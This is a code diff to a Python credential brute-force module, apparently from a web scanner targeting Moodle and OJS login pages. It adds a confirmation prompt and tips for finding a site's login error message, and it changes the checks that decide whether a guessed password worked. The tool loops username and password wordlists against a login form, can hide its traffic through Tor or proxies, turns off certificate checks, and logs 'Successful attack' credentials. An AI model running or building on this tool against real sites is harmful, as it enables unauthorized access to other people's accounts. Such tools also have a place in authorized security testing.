@@ -10,12 +10,35 @@ import socks # Tor
 import random
 
 def check(url, userField, passField, user, pwd, userFile, pwdFile, message,verbose,cookie,agent,proxip,proxport,tor,report):
+	print colored("\nBeginning BruteForce", 'yellow')
+	warning = raw_input('Please check that the arguments you gave to the tool are correct, Do you continue? [Y/n]') or 'Y'
+	if 'Y' in warning or 'y' in warning:
+		pass
+	else:
+		error = """
+Advices to check the arguments:
+ * Login: Remember that you only should introduce login part of the URL,e.g.: 
+  URL: http://example.com/moodle/login/index.php
+  Arguments should be: ./scanner.py -m http://example.com/moodle/ -B login/index.php,username,password,users,pass,'Invalid login'
+
+ * Error message: To check the correct error message showed by the site, you could try the following after one login:
+  - OJS: 
+	1.- Add at the beginning of the URL the tag "view-source" (without the quotes).
+	2.- Look for the form named "pkp_form_error" and inside the element, it would be the error message
+
+  - Moodle:
+	1.- Add at the beginning of the URL the tag "view-source" (without the quotes).
+	2.- Look for any of these tags: "loginerror" or "loginerrormessage" and next to them it should be the error message
+"""
+		print colored(error,'green')
+		sys.exit(2)
+		
 	b = ['','1','12']
 	a = []
 	
 	proxy = proxip  + ':' + proxport
 	proxies = {'http' : proxy, 'https' : proxy,}
-	print colored("\nBeginning BruteForce", 'yellow')
+	
 	
 	requests.packages.urllib3.disable_warnings()
 	if len(proxy) == 1:
@@ -76,6 +99,8 @@ def check(url, userField, passField, user, pwd, userFile, pwdFile, message,verbo
 			r = requests.post(url,payload,cookies = cookies, headers = headers,proxies = proxies,verify=False)
 		a.append(len(r.content))
 	
+	
+	
 	if len(userFile) == 0 and len(pwdFile) == 0 and len(user) > 0 and len(pwd) > 0 : # Sin archivos
 		single(url, userField, passField, user, pwd, userFile, pwdFile, message,verbose,cookies,headers,proxy,proxies,a,tor,report)
 	elif len(user) == 0 and len(pwd) == 0 and len(userFile) > 0 and len(pwdFile) > 0: # Ambos archvios
@@ -102,8 +127,9 @@ def single(url, userField, passField, user, pwd, userFile, pwdFile, message,verb
 	else:
 		r = requests.post(url,payload,cookies = cookies, headers = headers,proxies = proxies,verify=False)
 	
-	if list[1] - 1 == list[0] and list[2] -2 == list[0]: # Si en la respuesta devuelve el nombre de usuario
-		if int(len(r.content)) - int(len(user)) == list[0] and mbefore in r.content:
+	
+	if list[1] - 1 == list[0] and list[2] -2 == list[0]: # Si en la respuesta devuelve el nombre de usuario	
+		if int(len(r.content)) - int(len(user)) == list[0] or mbefore in r.content:
 			if int(verbose) == 1:
 				print colored('Attack not successfully  ', 'red')
 				l.append('Attack not successfully with: ' + 'User: ' + user + ' Password: ' + pwd)
@@ -124,8 +150,10 @@ def single(url, userField, passField, user, pwd, userFile, pwdFile, message,verb
 				print colored('Successful attack with: ', 'green') + 'User: ' + colored(user,'blue') + ' Password: ' + colored(pwd,'blue')	
 				l.append('Successful attack with: ' + 'User: ' + user + ' Password: ' + pwd)
 	
+	
 	elif list[0] == list[1] and list[0] == list[2]: # Si el Content-Lenght es igual
-		if int(len(r.content)) == list[0] and mbefore in r.content:
+		
+		if int(len(r.content)) == list[0] or mbefore in r.content:
 			if int(verbose) == 1:
 				print colored('Attack not successfully  ', 'red')
 				l.append('Attack not successfully with: ' + 'User: ' + user + ' Password: ' + pwd)
@@ -197,7 +225,7 @@ def usersFile(url, userField, passField, user, pwd, userFile, pwdFile, message,v
 				r = requests.post(url,data = payload, cookies = cookies, headers = headers, proxies = proxies,verify=False)
 				
 			if list[1] - 1 == list[0] and list[2] -2 == list[0]: # Si en la respuesta devuelve el nombre de usuario
-				if int(len(r.content)) - int(len(users[i])-1) == list[0] and mbefore in r.content:
+				if int(len(r.content)) - int(len(users[i])-1) == list[0] or mbefore in r.content:
 					if int(verbose) == 1:
 						print colored('Attack not successfully  ', 'red')
 						l.append('Attack not successfully with: ' + 'User: ' + users[i].rstrip('\n') + ' Password: ' + pwd)
@@ -291,7 +319,7 @@ def passFile(url, userField, passField, user, pwd, userFile, pwdFile, message,ve
 				r = requests.post(url,data = payload,cookies = cookies, headers = headers,proxies = proxies,verify=False)
 				
 			if list[1] - 1 == list[0] and list[2] -2 == list[0]: # Si en la respuesta devuelve el nombre de usuario
-				if int(len(r.content)) - int(len(user)) == list[0] and mbefore in r.content:
+				if int(len(r.content)) - int(len(user)) == list[0] or mbefore in r.content:
 					if int(verbose) == 1:
 						print colored('Attack not successfully  ', 'red')
 						l.append('Attack not successfully with: ' + 'User: ' + user + ' Password: ' + passwords[i].rstrip('\n'))
@@ -313,7 +341,7 @@ def passFile(url, userField, passField, user, pwd, userFile, pwdFile, message,ve
 						l.append('Successful attack with: ' + 'User: ' + user + ' Password: ' + passwords[i].rstrip('\n'))
 			
 			elif list[0] == list[1] and list[0] == list[2]: # Si el Content-Lenght es igual
-				if int(len(r.content)) == list[0] and mbefore in r.content:
+				if int(len(r.content)) == list[0] or mbefore in r.content:
 					if int(verbose) == 1:
 						print colored('Attack not successfully  ', 'red')
 						l.append('Attack not successfully with: ' + 'User: ' + user + ' Password: ' + passwords[i].rstrip('\n'))
@@ -397,7 +425,7 @@ def doubleFile(url, userField, passField, user, pwd, userFile, pwdFile, message,
 					r = requests.post(url,data = payload,cookies = cookies, headers = headers,proxies = proxies,verify=False)
 					
 				if list[1] - 1 == list[0] and list[2] -2 == list[0]: # Si en la respuesta devuelve el nombre de usuario
-					if int(len(r.content)) - int(len(users[i])-1) == list[0] and mbefore in r.content:
+					if int(len(r.content)) - int(len(users[i])-1) == list[0] or mbefore in r.content:
 						if int(verbose) == 1:
 							print colored('Attack not successfully  ', 'red')
 							l.append('Attack not successfully with: ' + 'User: ' + users[i].rstrip('\n') + ' Password: ' + passwords[j].rstrip('\n'))
@@ -424,7 +452,7 @@ def doubleFile(url, userField, passField, user, pwd, userFile, pwdFile, message,
 						j + 1
 						
 				elif list[0] == list[1] and list[0] == list[2]: # Si el Content-Lenght es igual
-					if int(len(r.content)) == list[0] and mbefore in r.content:
+					if int(len(r.content)) == list[0] or mbefore in r.content:
 						if int(verbose) == 1:
 							print colored('Attack not successfully  ', 'red')
 							l.append('Attack not successfully with: ' + 'User: ' + users[i].rstrip('\n') + ' Password: ' + passwords[j].rstrip('\n'))
